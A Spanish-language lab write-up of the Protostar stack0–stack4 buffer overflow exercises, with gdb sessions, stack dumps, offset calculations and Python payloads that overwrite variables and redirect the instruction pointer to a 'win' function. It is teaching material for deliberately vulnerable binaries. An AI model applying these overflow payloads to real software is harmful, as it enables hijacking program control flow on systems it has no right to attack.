



---------------------------------------------------------------------------
# Concepto de Buffer Overflow -> [stack0](https://exploit.education/protostar/stack-zero/)

Este binario toma el input del usuario, según el código lo mete en un buffer de 64 bytes con la función gets()

```console
[user@protostar]-[/opt/protostar/bin]:$ ./stack0 
AAAAAAA
Try again?
```
¿Si probamos a meterle mas "A" de las que caben en el buffer?

```console
[user@protostar]-[/opt/protostar/bin]:$ ./stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable "Has cambiado la varaible de nombre 'modified'"
Segmentation fault
```
Parece que hemos modificado una varaible. Es decir hemos metido tantas "A" que hemos desbordado el espacio que había para ellas y escrito en otros registros.
Vamos a ver esto con más claridad en gdb.

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack0 
(gdb) set disassembly-flavor intel
(gdb) disas main
Insutrucciones en ensamblador...
0x08048433 <main+63>:	leave  -> Penúltima insutrución.
(gdb) b *0x08048433 -> Si detenemos el programa aquí podremos oberservar la pila, ya que es despues de que le metamos datos.
```
Observaremos la pila tanto desbordando el buffer como sin hacerlo.

```console
(gdb) run 
AAAAAAAAAAA                                                                                            
Try again?
Breakpoint alcanzado !
(gdb) disas main
...
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax   -> Estas dos instrucciones miran si hay algo en [esp+0x5c]
...
(gdb) x/x $esp+0x5c
0xbffff69c:	0x00000000 -> Si observamos su contenido vemos que son todo ceros, ¿Será esta la varaible "modified"?
(gdb) x/24wx $esp -> Observamos unos cuantos registros de la pila.
0xbffff640:	0x08048529	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x41414141   -> Parece que nuestro input empieza aquí 0xbffff65c (0xbffff650+12)
0xbffff660:	0x41414141	0x00414141	0xbffff678	0x080482e8
0xbffff670:	0xb7ff1040	0x08049620	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff6a8
0xbffff690:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000   -> Y aquí está la varaible "modified" de antes (0xbffff69c)
```
Ahora con el desbordamiento.
```console
(gdb) run 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
you have changed the 'modified' variable
Breakpoint alcanzado !
(gdb) x/24wx $esp
0xbffff640:	0x08048500	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141 -> Ahora modified en vez de ser 0 es AAAA por tanto la hemos modificado.
(gdb) info registers
eip            0x41414141	0x41414141   
```
Como el puntero de insutrucción tambíen esta sobreescrito el programa corrompe, ya que la direccion 0x41414141 no existe.

```console
(gdb) p 0xbffff69c - 0xbffff65c -> Restamos la direccion de la varaible modified y en donde empezamos a escribir las "A"
$5 = 64 
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack0
Try again?
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*68)" | ./stack0
you have changed the 'modified' variable -> Aquí hemos sobreescrito la varaible pero sin corromper el eip.
```
Como conclusión, si tenemos un trozo de memoria pensado para qel usaurio meta datos pero este escriba mas de la cuenta, 
puede sobreescribir otras datos en la memoria y modificar el programa por dentro.

---------------------------------------------------------------------------
# Sobreescribir una variable con datos concretos -> [stack1](https://exploit.education/protostar/stack-one/)

Aquí también hay que sobreescribir una variable, pero en vez de que simplemente no sea 0, tiene que valer algo en concreto.
Nos piden en el código que valga "0x61626364" o sea como los bytes se dan la vuelta es "\x64\x63\x62\x61"

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack1
(gdb) set disassembly-flavor intel
(gdb) disas main
0x080484ab <main+71>:	cmp    eax,0x61626364 -> Lo compara con eax
```
El buffer es del mismo tamaño que antes...

```console
[user@protostar]-[/opt/protostar/bin]:$ ./stack1 $(python -c "print('A'*64)")
Try again, you got 0x00000000
[user@protostar]-[/opt/protostar/bin]:$ ./stack1 $(python -c "print('A'*68)")
Try again, you got 0x41414141
[user@protostar]-[/opt/protostar/bin]:$ ./stack1 $(python -c "print('A'*64 + '\x64\x63\x62\x61')")
you have correctly got the variable to the right value
```

---------------------------------------------------------------------------
# Sobreescribir un puntero de instrucción -> [stack3](https://exploit.education/protostar/stack-one/)

Aquí tenemos que modificar el registro "eip" el cual contiene la dirección de la siguiente insutrucción que el programa va a ejecutar. 
Hay que mandarlo en concreto a la funcion "win"

```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -d ./stack3 | grep "win"
08048424 <win>
```
En el codigo de gdb *disas main* no hay ninguna llamada a esta función de por si. El eip apunta a la insutrccion de nuestros breakpoints 
ya que esta todavia no se ha ejecutado.

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack3
(gdb) b *0x08048477 -> 0x08048477 <main+63>:	leave
(gdb) r
AAAA
Breakpoint alcanzado
(gdb) i r
eip            0x8048477	0x8048477 <main+63>


[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack3
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'B'*4)" | ./stack3
calling function pointer, jumping to 0x42424242
Segmentation fault
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'B'*4)"  > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack3
(gdb) b *0x08048477 
(gdb) run < /tmp/pattern
(gdb) x/40wx $esp
0xbffff63c:	0x08048477	0x08048560	0x41414141	0xb7fff8f8
0xbffff64c:	0xb7f0186e	0xb7fd7ff4	0xb7ec6165	0xbffff668
0xbffff65c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff66c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff67c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff69c:	0x42424242	0x08048400	0x00000000	0xbffff728
(gdb) x/x $eip -> El eip esta justo despues del buffer en este caso, en "0xbffff69c"
0x41414141:	Cannot access memory at address 0x41414141
```
En vez de meterle "AAAA" al eip hay que meterle la direccion de una función real, en concreto la de "win" que es: 08048424 o "\x24\x84\x04\x08"

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
Con python se puede meter la memoria sin tener que darle la vuelta gracias al módulo "struct"

```python
import struct
payload = "A"*64
payload += struct.pack('I', 0x08048424)
print payload
```
```console
[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
---------------------------------------------------------------------------

# Sobreescribir un puntero de instrucción 2 -> [stack4](https://exploit.education/protostar/stack-four/)

La teoría es la misma que con el caso anterior, solo que este es algo mas realista ya que el eip no esta pegado al final del buffer.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack4
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*76)" | ./stack4
Segmentation fault
```
Para ver lo que está pasando, vamos a hacer un patrón reconocible y pasarlo por gdb.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'BBBBCCCCDDDDEEEEFFFFGGGG')" > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack4
(gdb) b *0x0804841d -> Ponemos el breakpoint en la instrucción "leave"
(gdb) run < /tmp/pattern
Breakpoint alcazado!
(gdb) x/40wx $esp
0xbffff650:	0xbffff660	0xb7ec6165	0xbffff668	0xb7eada75
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff6b0:	0x46464646	0x47474747	0xbffff700	0xb7fe1848
Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) p 0xbffff6ac - 0xbffff660
$1 = 76 -> Justo donde antes nos daba SEGFAULT
```
Ahora la instrucción win es 0x080483f4 o "\xf4\x83\x04\x08"

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*76 + '\xf4\x83\x04\x08')" | ./stack4
code flow successfully changed
Segmentation fault -> Aunque se queje nos ha ejecutado la win (el mensaje de antes)
```
```console
(gdb) disas win
0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:	call   0x804832c <puts@plt>
...
(gdb) x/s 0x80484e0
0x80484e0:	 "code flow successfully changed"
```
---------------------------------------------------------------------------
